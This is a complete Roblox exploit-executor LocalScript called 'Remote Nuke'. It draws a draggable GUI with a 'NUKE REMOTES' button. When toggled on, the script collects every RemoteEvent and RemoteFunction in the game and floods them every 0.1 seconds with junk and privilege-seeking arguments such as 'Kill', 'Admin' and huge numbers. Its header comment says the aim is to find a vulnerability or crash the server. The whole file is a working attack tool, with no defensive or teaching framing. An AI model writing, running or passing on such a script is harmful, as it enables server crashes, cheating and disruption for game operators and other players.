-- LocalScript (executor) — Remote Nuke
-- Spams every remote in the game to find a vulnerability or crash the server.

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "TBSOBR_Nuke"
gui.ResetOnSpawn = false
gui.DisplayOrder = 2147483647
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0, 20, 0, 20)
frame.BackgroundColor3 = Color3.fromRGB(18, 16, 26)
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)

local btn = Instance.new("TextButton")
btn.Size = UDim2.new(1, -20, 0, 40)
btn.Position = UDim2.new(0, 10, 0, 30)
btn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
btn.Text = "NUKE REMOTES"
btn.TextColor3 = Color3.fromRGB(20, 16, 30)
btn.Font = Enum.Font.GothamBold
btn.Parent = frame
Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

local active = false

btn.MouseButton1Click:Connect(function()
    active = not active
    btn.Text = active and "NUKING..." or "NUKE REMOTES"
    if not active then return end

    local remotes = {}
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(remotes, v)
        end
    end

    task.spawn(function()
        while active do
            for _, remote in ipairs(remotes) do
                pcall(function()
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer()
                        remote:FireServer(true)
                        remote:FireServer(999999999)
                        remote:FireServer(LocalPlayer)
                        remote:FireServer("Kill")
                        remote:FireServer("Admin")
                        remote:FireServer(Vector3.new(0, -5000, 0))
                    else
                        remote:InvokeServer()
                        remote:InvokeServer(true)
                        remote:InvokeServer(999999999)
                    end
                end)
            end
            task.wait(0.1)
        end
    end)
end)
